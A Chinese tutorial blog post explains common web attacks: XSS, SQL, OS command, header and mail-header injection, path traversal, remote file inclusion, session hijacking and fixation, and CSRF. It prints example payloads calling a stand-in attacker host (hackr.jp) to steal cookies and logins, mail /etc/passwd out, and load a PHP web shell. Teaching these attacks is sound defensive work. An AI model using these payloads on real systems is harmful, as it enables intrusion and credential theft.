# 前端学HTTP之web攻击技术

&emsp;&emsp;简单的HTTP协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标。本文将详细介绍攻击web站点的手段

&nbsp;

### 总括

&emsp;&emsp;与最初的设计相比，现今的Web网站应用的HTTP协议的使用方式已发生了翻天覆地的变化。几乎现今所有的Web网站都会使用会话(session)管理、加密处理等安全性方面的功能，而HTTP协议内并不具备这些功能

&emsp;&emsp;从整体上看，HTTP就是一个通用的单纯协议机制。因此它具备较多优势，但是在安全性方面则呈劣势

&emsp;&emsp;就拿远程登录时会用到的SSH协议来说，SSH具备协议级别的认证及会话管理等功能，HTTP协议则没有。另外在架设SSH服务方面，任何人都可以轻易地创建安全等级高的服务，而HTTP即使已架设好服务器，但若想提供服务器基础上的Web应用，很多情况下都需要重新开发

&emsp;&emsp;因此，开发者需要自行设计并开发认证及会话管理功能来满足Web应用的安全。而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备，可仍在运作的Web应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的Bug

&emsp;&emsp;在Web应用中，从浏览器那接收到的HTTP请求的全部内容，都可以在客户端自由地变更、篡改。所以Web应用可能会接收到与预期数据不相同的内容

&emsp;&emsp;在HTTP请求报文内加载攻击代码，就能发起对Web应用的攻击。通过URL查询字段或表单、HTTP首部、Cookie等途径把攻击代码传入，若这时Web应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限

![webAttack1](https://pic.xiaohuochai.site/blog/HTTP_webAttack1.png)

【攻击模式】

&emsp;&emsp;对Web应用的攻击模式有以下两种：主动攻击和被动攻击

**以服务器为目标的主动攻击**

&emsp;&emsp;主动攻击(active attack)是指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源

&emsp;&emsp;主动攻击模式里具有代表性的攻击是SQL注入攻击和OS命令注入攻击

![webAttack2](https://pic.xiaohuochai.site/blog/HTTP_webAttack2.png)

**以服务器为目标的被动攻击**

&emsp;&emsp;被动攻击(passive attack)是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标Web应用访问发起攻击

&emsp;&emsp;被动攻击通常的攻击模式如下所示

&emsp;&emsp;步骤1：攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP请求

&emsp;&emsp;步骤2：当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱

&emsp;&emsp;步骤3：中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用，运行攻击代码

&emsp;&emsp;步骤4：执行完攻击代码，存在安全漏洞的Web应用会成为攻击者的跳板，可能导致用户所持的Cookie等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果

![webAttack3](https://pic.xiaohuochai.site/blog/HTTP_webAttack3.png)

&emsp;&emsp;被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造

&emsp;&emsp;利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络范围内，即使是企业内网也同样会受到攻击

&emsp;&emsp;很多企业内网依然可以连接到互联网上，访问Web网站，或接收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用户触发陷阱后对企业内网发动攻击

![webAttack5](https://pic.xiaohuochai.site/blog/HTTP_webAttack5.png)

&nbsp;

### 输出值转义不完全

&emsp;&emsp;实施Web应用的安全对策可大致分为以下两部分：客户端的验证和Web应用端(服务器端)的验证

&emsp;&emsp;而Web应用端(服务器端)的验证又包括输入值验证和输出值转义

![webAttack4](https://pic.xiaohuochai.site/blog/HTTP_webAttack4.png)

&emsp;&emsp;多数情况下采用JavaScript在客户端验证数据。可是在客户端允许篡改数据或关闭JavaScript，不适合将JavaScript验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI体验的作用

&emsp;&emsp;Web应用端的输入值验证按Web应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策

&emsp;&emsp;从数据库或文件系统、HTML、邮件等输出Web应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害

【跨站脚本攻击】

&emsp;&emsp;跨站脚本攻击(Cross-Site Scripting，XSS)是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击

&emsp;&emsp;动态创建的HTML部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击

&emsp;&emsp;跨站脚本攻击有可能造成以下影响：利用虚假输入表单骗取用户个人信息；利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求；显示伪造的文章或图片

**跨站脚本攻击案例**

1、在动态生成HTML处发生

&emsp;&emsp;下面以编辑个人信息页面为例说明跨站脚本攻击。下方界面显示了用户输入的个人信息内容

![webAttack6](https://pic.xiaohuochai.site/blog/HTTP_webAttack6.png)

&emsp;&emsp;确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口一郎这样的HTML标签的字符串

![webAttack7](https://pic.xiaohuochai.site/blog/HTTP_webAttack7.png)

&emsp;&emsp;此时的确认界面上，浏览器会把用户输入的&lt;s&gt;解析成HTML标签，然后显示删除线

&emsp;&emsp;删除线显示出来并不会造成太大的不利后果，但如果换成使用script标签将会如何呢

2、XSS是攻击者利用预先设置的陷阱触发的被动攻击

&emsp;&emsp;跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱

&emsp;&emsp;下图网站通过地址栏中URI的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞

![webAttack8](https://pic.xiaohuochai.site/blog/HTTP_webAttack8.png)

&emsp;&emsp;充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web页面内，诱使用户去点击该URL

<div>
<pre>http://example.jp/login?ID="&gt;&lt;script&gt;var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";&lt;/script&gt;&lt;span+s="</pre>
</div>

&emsp;&emsp;浏览器打开该URI后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID和密码之后，就会直接发送到攻击者的网站(也就是`hackr.jp`)，导致个人登录信息被窃取

![webAttack9](https://pic.xiaohuochai.site/blog/HTTP_webAttack9.png)

&emsp;&emsp;之后，ID及密码会传给该正规网站，而接下来仍然按正常登录步骤，用户很难意识到自己的登录信息已泄露

&emsp;&emsp;对`http://example.jp/login?ID=yama`请求时对应的HTML源代码(摘录)

<div>
<pre>&lt;div class="logo"&gt;
&emsp;&emsp;&lt;img src="imglogo.gif" alt="E! 拍卖会" /&gt;
&lt;/div&gt;
&lt;form action="http://example.jp/login" method="post" id="login"&gt;
&lt;div class="input_id"&gt;
&emsp;&emsp;ID &lt;input type="text" name="ID" value="yama" /&gt;    
&lt;/div&gt;</pre>
</div>

&emsp;&emsp;`http://example.jp/login?ID="&gt;&lt;script&gt;var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";&lt;/script&gt;&lt;span+s="`对请求时对应的HTML源代码(摘录)

<div>
<pre>&lt;div class="logo"&gt;
&emsp;&emsp;&lt;img src="imglogo.gif" alt="E! 拍卖会 /&gt;
&lt;/div&gt;
&lt;form action="http://example.jp/login" method="post" id="login"&gt;
&lt;div class="input_id"&gt;
&emsp;&emsp;ID &lt;input type="text" name="ID" value=""&gt;&lt;script&gt;var f=document.getElementById("login"); f.action="http://hackr.jp/pwget"; f.method="get";&lt;/script&gt;&lt;span s=""/&gt;
&lt;/div&gt;</pre>
</div>

**对用户Cookie的窃取攻击**

&emsp;&emsp;除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie信息

<div>
<pre>&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;</pre>
</div>

&emsp;&emsp;该脚本内指定的`http://hackr.jp/xss.js`文件。即下面这段采用JavaScript编写的代码

<div>
<pre>var content = escape(document.cookie);
document.write("&lt;img src=http://hackr.jp/?");
document.write(content); 
document.write("&gt;");</pre>
</div>

&emsp;&emsp;在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段JavaScript程序，即可访问到该Web应用所处域名下的Cookie信息。然后这些信息会发送至攻击者的Web网站(`http://hackr.jp/`)，记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie信息了

![webAttack10](https://pic.xiaohuochai.site/blog/HTTP_webAttack10.png)

【SQL注入攻击】

**会执行非法SQL的SQL注入攻击**

&emsp;&emsp;SQL注入(SQL Injection)是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露

&emsp;&emsp;Web应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用SQL语句连接数据库进行特定的操作。如果在调用SQL语句的方式上存在疏漏，就有可能执行被恶意注入(Injection)非法SQL语句

&emsp;&emsp;SQL注入攻击有可能会造成以下影响：非法查看或篡改数据库内的数据；规避认证；执行和数据库服务器业务关联的程序等

&emsp;&emsp;SQL是用来操作关系型数据库管理系统(Relational DataBase Management System，RDBMS)的数据库语言，可进行操作数据或定义数据等。RDBMS中有名的数据库有Oracle Database、MicrosoftSQLServer、IBM DB2、MySQL和PostgreSQL等。这些数据库系统都可以把SQL作为数据库语言使用

&emsp;&emsp;使用数据库的Web应用，通过某种方法将SQL语句传给RDBMS，再把RDBMS返回的结果灵活地使用在Web应用中

<div>
<pre>SELECT title,text FROM newsTbl WHERE id=123</pre>
</div>

**SQL注入攻击案例**

&emsp;&emsp;下面以某个购物网站的搜索功能为例，讲解SQL注入攻击。通过该功能， 我们可以将某作者的名字作为搜索关键字，查找该作者的所有著作

![webAttack11](https://pic.xiaohuochai.site/blog/HTTP_webAttack11.png)

1、正常处理的操作示例

&emsp;&emsp;下图是将&ldquo;上野宣&rdquo;作为关键字的搜索结果

![webAttack12](https://pic.xiaohuochai.site/blog/HTTP_webAttack12.png)

&emsp;&emsp;URL的查询字段已指定q=上野宣，这个值由Web应用传入到SQL语句中，构成下方的SQL语句

<div>
<pre>SELECT * FROM bookTbl WHERE author = '上野宣' and flag = 1;</pre>
</div>

&emsp;&emsp;该SQL语句表示&ldquo;从bookTbl表中，显示满足author=上野宣 and flag=1(可 售)所在行的数据&rdquo;

&emsp;&emsp;数据库内的bookTbl表记录着该购物网站的所有书籍信息。通过SQL语句，将满足作者名(author)上野宣并且flag为1双重条件的条目取出，最后作为搜索结果显示出来

![webAttack13](https://pic.xiaohuochai.site/blog/HTTP_webAttack13.png)

2、SQL注入攻击的操作示例

&emsp;&emsp;把刚才指定查询字段的上野宣改写成&ldquo;上野宣'--&rdquo;

![webAttack14](https://pic.xiaohuochai.site/blog/HTTP_webAttack14.png)

&emsp;&emsp;构成的SQL语句就变成&ldquo;从数据库的 bookTbl 表中，显示满足 author= 上野 宣条件所在行的数据&rdquo;，如下所示

<div>
<pre>SELECT * FROM bookTbl WHERE author ='上野宣' -- ' and flag=1;</pre>
</div>

&emsp;&emsp;SQL语句中的--之后全视为注释。即，and flag=1 这个条件被自动忽略了

![webAttack15](https://pic.xiaohuochai.site/blog/HTTP_webAttack15.png)

&emsp;&emsp;结果跟 flag 的设定值无关，只取出满足author=&ldquo;上野宣&rdquo;条件所在行的数据，这样连那些尚未出版的书籍也一并显示出来了

![webAttack16](https://pic.xiaohuochai.site/blog/HTTP_webAttack16.png)

3、SQL注入攻击破坏SQL语句结构的案例

&emsp;&emsp;SQL注入是攻击者将SQL语句改变成开发者意想不到的形式以达到破坏结构的攻击

&emsp;&emsp;比如，在之前的攻击案例中，就会把author的字面值(程序中使用的常量)"上野宣'--"的字符串赋值给$q

![webAttack17](https://pic.xiaohuochai.site/blog/HTTP_webAttack17.png)

&emsp;&emsp;上图中颜色标记的字符串最开始的单引号(')表示会将author的字面值括起来，以到达第二个单引号后作为结束。因此，author的字面值就成了上野宣，而后面的--则不再属于author字面值，会被解析成其他的句法

&emsp;&emsp;本案例中的问题仅仅是把未出版书籍的条目也一同显示出来了。但实际发生SQL注入攻击时，很有可能会导致用户信息或结算内容等其他数据表的非法浏览及篡改，从而使用户遭受不同程度的损失

&nbsp;

【OS命令注入攻击】

&emsp;&emsp;OS命令注入攻击(OS Command Injection)是指通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险

&emsp;&emsp;可以从Web应用中通过Shell来调用操作系统命令。倘若调用Shell时存在疏漏，就可以执行插入的非法OS命令

&emsp;&emsp;OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。也就是说，通过OS注入攻击可执行OS上安装着的各种程序

**OS注入攻击案例**

&emsp;&emsp;下面以咨询表单的发送功能为例，讲解OS注入攻击。该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去

![webAttack18](https://pic.xiaohuochai.site/blog/HTTP_webAttack18.png)

&emsp;&emsp;下面摘选处理该表单内容的一部分核心代码

<div>
<pre>my $adr = $q-&gt;param('mailaddress');
open(MAIL, "| usrsbin/sendmail $adr");
print MAIL "From: info@example.com\n"</pre>
</div>

&emsp;&emsp;程序中的open函数会调用sendmail命令发送邮件，而指定的邮件发送地址即$adr的值

&emsp;&emsp;攻击者将下面的值指定作为邮件地址

<div>
<pre>;cat /etc/passwd | mail hack@example.jp</pre>
</div>

&emsp;&emsp;程序接收该值，构成以下的命令组合

<div>
<pre>| usrsbin/sendmail ; cat /etc/passwd | mail hack@example.jp</pre>
</div>

&emsp;&emsp;攻击者的输入值中含有分号(;)。这个符号在OS命令中，会被解析为分隔多个执行命令的标记

&emsp;&emsp;可见，sendmail命令执行被分隔后，接下去就会执行 cat etcpasswd | mail hack@example.jp这样的命令了。结果，含有Linux账户信息etcpasswd的文件，就以邮件形式发送给了hack@example.jp

【HTTP首部注入攻击】

&emsp;&emsp;HTTP首部注入攻击(HTTPHeader Injection)是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式

&emsp;&emsp;向首部主体内添加内容的攻击称为HTTP响应截断攻击(HTTPResponse Splitting Attack)

&emsp;&emsp;如下所示，Web应用有时会把从外部接收到的数值，赋给响应首部字段Location和Set-Cookie

<div>
<pre>Location: http://www.example.com/a.cgi?q=12345
Set-Cookie: UID=12345</pre>
</div>

&emsp;&emsp;HTTP首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。

&emsp;&emsp;HTTP首部注入攻击有可能会造成以下一些影响：设置任何Cookie信息；重定向至任意URL；显示任意的主体(HTTP响应截断攻击)

**HTTP首部注入攻击案例**

&emsp;&emsp;下面我们以选定某个类别后即可跳转至各类别对应页面的功能为例，讲解HTTP首部注入攻击。该功能为每个类别都设定了一个类别ID值，一旦选定某类别，就会将该ID值反映在响应内的Location首部字段内，形如`Location: http://example.com/?cat=101`。令浏览器发生重定向跳转

![webAttack19](https://pic.xiaohuochai.site/blog/HTTP_webAttack19.png)

&emsp;&emsp;攻击者以下面的内容替代之前的类别ID后发送请求

<div>
<pre>101%0D%0ASet-Cookie:+SID=123456789</pre>
</div>

&emsp;&emsp;其中，%0D%0A代表HTTP报文中的换行符，紧接着的是可强制将攻击者网站(`http://hackr.jp/`)的会话ID设置成SID=123456789的Set-Cookie首部字段。

&emsp;&emsp;发送该请求之后，假设结果返回以下响应

<div>
<pre>Location:http://example.com/?cat=101(%0D%0A:换行符)
Set-Cookie:SID=123456789</pre>
</div>

&emsp;&emsp;此刻，首部字段Set-Cookie已生效，因此攻击者可指定修改任意的Cookie信息。通过和会话固定攻击(攻击者可使用指定的会话ID)攻击组合，攻击者可伪装成用户

&emsp;&emsp;攻击者输入的%0D%0A，原本应该属于首部字段Location的查询值部分，但经过解析后，%0D%0A变成了换行符，结果插入了新的首部字段

&emsp;&emsp;这样一来，攻击者可在响应中插入任意的首部字段

**HTTP响应截断攻击**

&emsp;&emsp;HTTP响应截断攻击是用在HTTP首部注入的一种攻击。攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送。利用这两个连续的换行就可作出HTTP首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做HTTP响应截断攻击

<div>
<pre>%0D%0A%0D%0A&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容&lt;!--</pre>
</div>

&emsp;&emsp;在可能进行HTTP首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应

<div>
<pre>Set-Cookie: UID=(%0D%0A ：换行符)
(%0D%0A ：换行符)
&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容&lt;!--(原来页面对应的首部字段和主体部分全视为注释)</pre>
</div>

&emsp;&emsp;利用这个攻击，已触发陷阱的用户浏览器会显示伪造的Web页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果

&emsp;&emsp;另外，滥用HTTP/1.1中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替换掉的Web网页

【邮件首部注入攻击】

&emsp;&emsp;邮件首部注入(Mail Header Injection)是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件

**邮件首部注入攻击案例**

&emsp;&emsp;下面以Web页面中的咨询表单为例讲解邮件首部注入攻击。该功能可在表单内填入咨询者的邮件地址及咨询内容后，以邮件的形式发送给网站管理员

![webAttack20](https://pic.xiaohuochai.site/blog/HTTP_webAttack20.png)

&emsp;&emsp;攻击者将以下数据作为邮件地址发起请求

<div>
<pre>bob@hackr.jp%0D%0ABcc:user@example.com</pre>
</div>

&emsp;&emsp;%0D%0A在邮件报文中代表换行符。一旦咨询表单所在的Web应用接收了这个换行符，就可能实现对Bcc邮件地址的追加发送，而这原本是无法指定的

&emsp;&emsp;另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本内容并发送

<div>
<pre>bob@hackr.jp%0D%0A%0D%0ATest Message</pre>
</div>

&emsp;&emsp;再以相同的方法，就有可能改写To和Subject等任意邮件首部，或向文本添加附件等动作

【目录遍历攻击】

&emsp;&emsp;目录遍历(Directory Traversal)攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历(Path Traversal)攻击

&emsp;&emsp;通过Web应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用.../等相对路径定位到etcpassed等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除Web服务器上的文件

&emsp;&emsp;固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限

**目录遍历攻击案例**

&emsp;&emsp;下面以显示读取文件功能为例，讲解目录遍历攻击。该功能通过以下查询字段，指定某个文件名。然后从wwwlog/文件目录下读取这个指定的文件

<div>
<pre>http://example.com/read.php?log=0401.log</pre>
</div>

&emsp;&emsp;攻击者设置如下查询字段后发出请求

<div>
<pre>http://example.com/read.php?log=../..etcpasswd</pre>
</div>

&emsp;&emsp;查询字段为了读取攻击者盯上的etcpasswd文件，会从wwwlog/目录开始定位相对路径。如果这份read.php脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险

![webAttack21](https://pic.xiaohuochai.site/blog/HTTP_webAttack21.png)

【远程文件包含漏洞】

&emsp;&emsp;远程文件包含漏洞(Remote File Inclusion)是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击

&emsp;&emsp;这主要是PHP存在的安全漏洞，对PHP的include或require来说，这是一种可通过设定，指定外部服务器的URL作为文件名的功能。但是，该功能太危险，PHP5.2.0之后默认设定此功能无效

&emsp;&emsp;固然存在输出值转义的问题，但更应控制对任意文件名的指定

**远程文件包含漏洞的攻击案例**

&emsp;&emsp;下面以include读入由查询字段指定文件的功能为例，讲解远程文件包含漏洞。该功能可通过以下查询字段形式指定文件名，并在脚本内的include语句处读入这个指定文件

<div>
<pre>http://example.com/foo.php?mod=news.php</pre>
</div>

&emsp;&emsp;对应脚本的源代码如下所示

&emsp;&emsp;`http://example.com/foo.php`的源代码(部分摘录)

<div>
<pre>$modname=$_GET['mod'];
include($modname);</pre>
</div>

&emsp;&emsp;攻击者指定如同下面形式的URL发出请求

<div>
<pre>http://example.com/foo.php?mod=http://hackr.jp/cmd.php&amp;cmd=ls</pre>
</div>

&emsp;&emsp;攻击者已事先在外部服务器上准备了以下这段脚本

&emsp;&emsp;`http://hackr.jp/cmd.php`的源代码

<div>
<pre>&lt;?system($_GET['cmd'])?&gt;</pre>
</div>

&emsp;&emsp;假设Web服务器(`example.com`)的include可以引入外部服务器的URL，那就会读入攻击者在外部服务器上事先准备的URL(`http://hackr.jp/cmd.php`)。结果，通过system函数就能在Web服务器(`example.com`)上执行查询字段指定的OS命令了

![webAttack22](https://pic.xiaohuochai.site/blog/HTTP_webAttack22.png)

&emsp;&emsp;在以上攻击案例中，执行了可显示Web服务器(example.com)上文件及目录信息的ls命令

&nbsp;

### 设置或设计缺陷

&emsp;&emsp;因设置或设计上的缺陷引发的安全漏洞是指，错误设置Web服务器，或是由设计上的一些问题引起的安全漏洞

【强制浏览】

&emsp;&emsp;强制浏览(Forced Browsing)安全漏洞是指，从安置在Web服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件

&emsp;&emsp;强制浏览有可能会造成以下一些影响：泄露顾客的个人信息等重要情报；泄露原本需要具有访问权限的用户才可查阅的信息内容；泄露未外连到外界的文件

&emsp;&emsp;对那些原本不愿公开的文件，为了保证安全会隐蔽其URL。可一旦知道了那些URL，也就意味着可浏览URL对应的文件。直接显示容易推测的文件名或文件目录索引时，通过某些方法可能会使URL产生泄露

<div>
<pre>http://www.example.com/log/</pre>
</div>

&emsp;&emsp;通过指定文件目录名称，即可在文件一览中看到显示的文件名

<div>
<pre>http://www.example.com/entry/entry_081202.log</pre>
</div>

&emsp;&emsp;文件名称容易推测(按上面的情况，可推出下一个文件是entry_081203.log)

<div>
<pre>http://www.example.com/cgi-bin/entry.cgi(原始文件)
http://www.example.com/cgi-bin/entry.cgi~(备份文件)
http://www.example.com/cgi-bin/entry.bak(备份文件)</pre>
</div>

&emsp;&emsp;由编辑软件自动生成的备份文件无执行权限，有可能直接以源代码形式显示

&emsp;&emsp;直接通过URL访问原本必须经过认证才能在Web页面上使用的文件(HTML文件、图片、PDF等文档、CSS以及其他数据等)

**强制浏览导致安全漏洞的案例**

&emsp;&emsp;下面我们以会员制度的SNS日记功能为例，讲解强制浏览可能导致的安全漏洞。该日记功能保证了除具有访问权限的用户本人以外，其他人都不能访问日记

![webAttack23](https://pic.xiaohuochai.site/blog/HTTP_webAttack23.png)

&emsp;&emsp;该日记中包含的图像照片的源代码如下所示

<div>
<pre>&lt;img src="http://example.com/img/tRNqSUBdG7Da.jpg"&gt;</pre>
</div>

&emsp;&emsp;即使没有对这篇日记的访问权限，只要知道这图片的URL，通过直接指定URL的方式就能显示该图片。日记的功能和文本具有访问对象的控制，但不具备对图片访问对象的控制，从而产生了安全漏洞

【不正确的错误消息处理】

&emsp;&emsp;不正确的错误消息处理(Error Handling Vulnerability)的安全漏洞是指，Web应用的错误信息内包含对攻击者有用的信息。与Web应用有关的主要错误信息如下所示：Web应用抛出的错误消息和数据库等系统抛出的错误消息

&emsp;&emsp;Web应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示

**不正确的错误消息处理导致安全漏洞的案例**

1、Web应用抛出的错误消息

&emsp;&emsp;下面以认证功能的认证错误消息为例，讲解不正确的错误消息处理方式。该认证功能，在输入表单内的邮件地址及密码匹配发生错误时，会提示错误信息

![webAttack24](https://pic.xiaohuochai.site/blog/HTTP_webAttack24.png)

&emsp;&emsp;上方画面提示&ldquo;邮件地址未注册&rdquo;的错误消息。当输入的邮件地址尚未在该Web网站上注册时，就会触发这条错误消息。因为倘若邮件地址存在，应该会提示&ldquo;输入的密码有误&rdquo;之类的错误消息

&emsp;&emsp;攻击者利用进行不同的输入会提示不同的错误信息这条，就可用来确认输入的邮件地址是否已在这个Web网站上注册过了

&emsp;&emsp;为了不让错误消息给攻击者以启发，建议将提示消息的内容仅保留到&ldquo;认证错误&rdquo;这种程度即可

2、数据库等系统抛出的错误消息

&emsp;&emsp;下面我们以搜索功能提示的错误信息为例，讲解不正确的错误消息处理。本功能用于检索数据，当输入未预料的字符串时，会提示数据库的错误

![webAttack25](https://pic.xiaohuochai.site/blog/HTTP_webAttack25.png)

&emsp;&emsp;上方的画面中显示了与SQL有关的错误信息。对开发者而言，该信息或许在Debug时会有帮助，但对用户毫无用处。攻击者从这条消息中可读出数据库选用的是MySQL，甚至还看见了SQL语句的片段。这可能给攻击者进行SQL注入攻击以启发。系统抛出的错误主要集中在以下几个方面：PHP或ASP等脚本错误；数据库或中间件的错误；Web服务器的错误。各系统应对详细的错误消息进行抑制设定，或使用自定义错误消息，以避免某些错误信息给攻击者以启发

【开放重定向】

&emsp;&emsp;开放重定向(Open Redirect)是一种对指定的任意URL作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导至那个Web网站

**开放重定向的攻击案例**

&emsp;&emsp;我们以下面的URL做重定向为例，讲解开放重定向攻击案例。该功能就是向URL指定参数后，使本来的URL发生重定向跳转

<div>
<pre>http://example.com/?redirect=http://www.tricorder.jp</pre>
</div>

&emsp;&emsp;攻击者把重定向指定的参数改写成已设好陷阱的Web网站对应的连接，如下所示

<div>
<pre>http://example.com/?redirect=http://hackr.jp</pre>
</div>

&emsp;&emsp;用户看到URL后原以为访问`example.com`，不料实际上被诱导至hackr.jp这个指定的重定向目标

&emsp;&emsp;可信度高的Web网站如果开放重定向功能，则很有可能被攻击者选中并用来作为钓鱼攻击的跳板

&nbsp;

### 会话管理疏忽

&emsp;&emsp;会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果

【会话劫持】

&emsp;&emsp;会话劫持(Session Hijack)是指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击的目的

![webAttack26](https://pic.xiaohuochai.site/blog/HTTP_webAttack26.png)

&emsp;&emsp;具备认证功能的Web应用，使用会话ID的会话管理机制，作为管理认证状态的主流方式。会话ID中记录客户端的Cookie等信息，服务器端将会话ID与认证状态进行一对一匹配管理

&emsp;&emsp;下面列举了几种攻击者可获得会话ID的途径：通过非正规的生成方法推测会话ID；通过窃听或XSS攻击盗取会话ID；通过会话固定攻击(Session Fixation)强行获取会话ID

**会话劫持攻击案例**

&emsp;&emsp;下面我们以认证功能为例讲解会话劫持。这里的认证功能通过会话管理机 制，会将成功认证的用户的会话ID(SID)保存在用户浏览器的Cookie中

![webAttack27](https://pic.xiaohuochai.site/blog/HTTP_webAttack27.png)

&emsp;&emsp;攻击者在得知该Web网站存在可跨站攻击(XSS)的安全漏洞后，就设置好用JavaScript脚本调用document.cookie以窃取Cookie信息的陷阱，一旦用户踏入陷阱(访问了该脚本)，攻击者就能获取含有会话ID的Cookie

&emsp;&emsp;攻击者拿到用户的会话ID后，往自己的浏览器的Cookie中设置该会话ID，即可伪装成会话ID遭窃的用户，访问Web网站了

【会话固定攻击】

&emsp;&emsp;对以窃取目标会话ID为主动攻击手段的会话劫持而言，会话固定攻击(Session Fixation)攻击会强制用户使用攻击者指定的会话ID，属于被动攻击

**会话固定攻击案例**

&emsp;&emsp;下面我们以认证功能为例讲解会话固定攻击。这个Web网站的认证功能，会在认证前发布一个会话ID，若认证成功，就会在服务器内改变认证状态

![webAttack28](https://pic.xiaohuochai.site/blog/HTTP_webAttack28.png)

&emsp;&emsp;攻击者准备陷阱，先访问Web网站拿到会话ID(SID=f5d1278e8109)。此刻，会话ID在服务器上的记录仍是(未认证)状态。(步骤①~②)

&emsp;&emsp;攻击者设置好强制用户使用该会话ID的陷阱，并等待用户拿着这个会话ID前去认证。一旦用户触发陷阱并完成认证，会话ID(SID=f5d1278e8109)在服务器上的状态(用户A已认证)就会被记录下来。(步骤③)

&emsp;&emsp;攻击者估计用户差不多已触发陷阱后，再利用之前这个会话ID访问网站。由于该会话ID目前已是(用户A已认证)状态，于是攻击者作为用户A的身份顺利登录网站。(步骤④)

**Session Adoption**

&emsp;&emsp;Session Adoption是指PHP或ASP.NET能够接收处理未知会话ID的功能

&emsp;&emsp;恶意使用该功能便可跳过会话固定攻击的准备阶段，从Web网站获得发行的会话ID的步骤。即，攻击者可私自创建会话ID构成陷阱，中间件却会误以为该会话ID是未知会话ID而接受

【跨站点请求伪造】

&emsp;&emsp;跨站点请求伪造(Cross-Site Request Forgeries，CSRF)攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击

&emsp;&emsp;跨站点请求伪造有可能会造成以下等影响：利用已通过认证的用户权限更新设定信息等；利用已通过认证的用户权限购买商品；利用已通过认证的用户权限在留言板上发表言论

**跨站点请求伪造的攻击案例**

